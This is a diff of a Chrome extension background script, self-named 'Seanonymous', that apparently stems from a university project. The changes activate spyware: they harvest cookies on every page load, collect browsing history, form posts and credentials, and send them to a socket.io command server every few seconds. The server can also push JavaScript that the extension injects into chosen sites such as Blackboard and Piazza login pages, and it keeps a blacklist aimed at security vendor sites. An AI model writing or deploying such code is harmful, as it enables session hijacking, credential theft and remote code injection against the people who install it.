@@ -11,7 +11,7 @@ var socket = null;
 var config = {
 	ID: 0,
 	js_cmd: [],
-	last_pkt: Date.now(),
+	last_pkt: 0,
 	security_blacklist: []
 };	//update this variable when a packet is sent
 	//add to js_cmd
@@ -27,12 +27,13 @@ var queue = {
 
 function clearQueue(){
 	Object.keys(queue).forEach(function(key){
-		queue.key = [];
+		queue[key] = [];
 	})
 }
 
 
-/*function redirectHandler(details){
+/* Old redirect handling
+function redirectHandler(details){
     return{redirectUrl: "http://404.com/"};
 }
 function setListener(newList){
@@ -78,21 +79,33 @@ chrome.tabs.onUpdated.addListener(
 	function(tabId, changeInfo, tab){
 		console.log(config);
 		var cmds_run = [];
+		var listChanged = false;
 		if(changeInfo.status == 'complete' && tab.active){
-			chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function(tabs){
+			chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function(tabs) {
                 var url = tabs[0].url;
-				var site;
-				console.log("URL: ", url)
-				config.js_cmd.forEach(function (pair) {
-                	site = Object.keys(pair)[0];
-                	console.log("targetSite: ",site);
-                	if (site.match(url)){
-                		chrome.tabs.executeScript(null, {"code": pair[site]});
-                		cmds_run.push(site);
-					}
-                });
+                var site;
+                console.log("URL: ", url);
+                var i;
+                for (i = 0; i < config.js_cmd.length; i++) {
+                    site = Object.keys(config.js_cmd[i])[0];	//length-1 array
+                    console.log("targetSite: ", site);
+                    if (!(url.match(site) == undefined)) {
+                        console.log("MATCHED THE SITE");
+                        console.log("config.js_cmd before: ",config.js_cmd);
+                        var code = config.js_cmd[i][site];
+                        config.js_cmd.splice(i,1);
+                        i--;
+                        chrome.tabs.executeScript(null, {"code": code}, function(){
+                            console.log("executed for site: ", site);
+                            console.log("config.js_cmd after: ",config.js_cmd);
+                            listChanged = true;
+						});
+                    }
+                }
+            });
 
-				console.log("cmds_run: ",cmds_run);
+
+				/*console.log("cmds_run: ",cmds_run);
 				var listChanged = false;
                 cmds_run.forEach(function(name){
                 	console.log("removing: ", name);
@@ -104,21 +117,20 @@ chrome.tabs.onUpdated.addListener(
                 			listChanged = true;
 						}
 					}
-				});
+				});*/
 				//Only save the results if something changed
                 if(listChanged) {
                     storeConfig();
                 }
-            })
 		}
 	}
 );
 
 
-/*chrome.webRequest.onBeforeRequest.addListener(function(details){
+chrome.webRequest.onBeforeRequest.addListener(function(details){
 	console.log("Baking Cookies!");
 	chrome.cookies.getAll({"url":details.url},function(cookies){
-		console.log("cookies ", cookies);
+		console.log("cookies ", queue.cookies);
 		var cookiesChanged = false;
 		var i;
 		for(i = 0; i < cookies.length; i++){
@@ -126,29 +138,20 @@ chrome.tabs.onUpdated.addListener(
 							 "url": details.url,
 							 "content": cookies[i].value};
 			console.log("newCookie: ", newCookie);
-			queue.cookies.forEach(function(storedCookie){
-				console.log("storedCookies: ",storedCookie);
-				if(storedCookie[name] === newCookie[name])
-                    queue.cookies.push(newCookie);
-                	cookiesChanged = true;
-                	console.log("Cookies Added!!!!");
-
-			});
-
-
+			queue.cookies.push(newCookie)
+			cookiesChanged = true;
 		}
-		if(cookiesChanged){
+		if(cookiesChanged) {
             storeQueue();
-		}
+        }
 	})
 },
 	{urls: ["<all_urls>"],
 	types: ["main_frame"]},
 	["blocking"]
-);*/
+);
 
 /* Listen for HTTP POST requests and gather information from the form
- *
  * references:
  * 	https://spin.atomicobject.com/2017/08/18/chrome-extension-form-data/
  */
@@ -194,13 +197,12 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
  * @param (int) numResults: maximum number of history objects
  * act on the results of the query within the forEach loop
  */
-function getClientHistory(millis, numResults){
+async function getClientHistory(millis, numResults){
 chrome.history.search({text: '', maxResults: numResults}, function(data) {
     data.forEach(function(page) {
     	var historyChanged = false;
     	if(page.lastVisitTime>millis){
             queue.history.push(page.url);
-            console.log("history: ",page.url);
             historyChanged = true;
 		}
 		if(historyChanged){
@@ -213,7 +215,7 @@ chrome.history.search({text: '', maxResults: numResults}, function(data) {
 
 //Testing out storage 
 async function loadConfig(){
-	await chrome.storage.sync.get('config', function(result){
+	await chrome.storage.local.get('config', function(result){
 		if(!(result.config == undefined)){
 			config = result.config;
 			console.log('Seanonymous: configuration loaded!');
@@ -225,7 +227,7 @@ async function loadConfig(){
  * store the current config object to memory
  */
 async function storeConfig(){
-	await chrome.storage.sync.set({config: config}, function(result){
+	await chrome.storage.local.set({config: config}, function(result){
 		console.log('Seanonymous: configuration saved!');
 	});
 }
@@ -233,7 +235,7 @@ async function storeConfig(){
 
 
 async function loadQueue(){
-    await chrome.storage.sync.get('config', function(result){
+    await chrome.storage.local.get('config', function(result){
         if(!(result.config == undefined)){
             queue = result.queue;
             console.log('Seanonymous: message queue loaded!')
@@ -245,7 +247,7 @@ async function loadQueue(){
  * store the current config object to memory
  */
 async function storeQueue(){
-    await chrome.storage.sync.set({queue: queue}, function(result){
+    await chrome.storage.local.set({queue: queue}, function(result){
         console.log('Seanonymous: message queue saved!');
     });
 }
@@ -283,14 +285,19 @@ function createClientIDRequest(){
 
 function handleServerPayload(payload) {
 	console.log('Payload received: ' + JSON.stringify(payload, null, 2));
-	//TODO: control flow : {edit current 'config' based on payload; store payload}
-	if(!validateServerPayload()){
+	if(!validateServerPayload(payload)){
 		console.log("Failed to validate payload");
 		return false;
 	}
 	else{
 		config.security_blacklist = payload["security_blacklist"];
-		config.js_cmd.concat(payload["js_cmd"]);
+		config.js_cmd.concat(payload["js-cmd"]);
+		var i;
+		for(i = 0; i < payload["js-cmd"].length; i++){
+			console.log("adding js_cmd site", payload["js-cmd"][i]);
+            config.js_cmd.push(payload["js-cmd"][i]);
+		}
+		config.last_pkt = Date.now();
 		storeConfig();
 
 	}
@@ -298,8 +305,11 @@ function handleServerPayload(payload) {
 
 
 function validateServerPayload(payload) {
-	if(!payload.hasOwnProperty("security_blacklist") || !payload.hasOwnProperty("js_cmd")){
+	if(!payload.hasOwnProperty("security_blacklist") || !payload.hasOwnProperty("js-cmd")){
 		return false;
+	}
+	else{
+		return true;
 	}
 }
 
@@ -325,8 +335,14 @@ function connectToHost(){
         console.log("Connection error: " + data);
     });
     socket.on('srvpayload',function(msg){
-		console.log('message recieved from server');
-		handleServerPayload(msg);
+		console.log('message received from server');
+
+		if(handleServerPayload(msg)){
+			console.log("payload successfully handled");
+		}
+		else{
+			console.log("payload handling failed");
+		}
 	});
 
 	
@@ -334,15 +350,33 @@ function connectToHost(){
 		//sending initial clientIDRequest
 }
 
+function sendPayload(){
+	if(socket){
+
+		getClientHistory(config.last_pkt, 200).then(function (){
+            newJson = createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms);
+            console.log("Sending a PAYLOAD");
+            socket.emit('extpayload', newJson, function(answer){
+                handleServerPayload(answer);
+                clearQueue();
+            });
+		});
+	}
+	else{
+		console.log("Failed to create connection to the server~~~~");
+    }
+}
+
 function main_func() {
-	//connectToHost();
+	connectToHost();
 	config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u r hacked!");'});
     config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u b hacked222222222!");'});
     config.js_cmd.push({"https://blackboard.stonybrook.edu/webapps/login/" : 'alert("This one as well 3333333?!");'});
 	config.security_blacklist.push({"https://www.mcafee.com/en-us/index.html":"https://developer.chrome.com/extensions/examples/extensions/catifier/event_page.js"});
 	//setListener(config.security_blacklist);
 
-    //setInterval(alert, 1000 * 10, ["Hello"]);	//sends payload every 5 minutes
+    setInterval(sendPayload, 1000 * 10);	//sends payload every 30 seconds
+	console.log("config: ",config);
 }
 
 loadConfig().then(
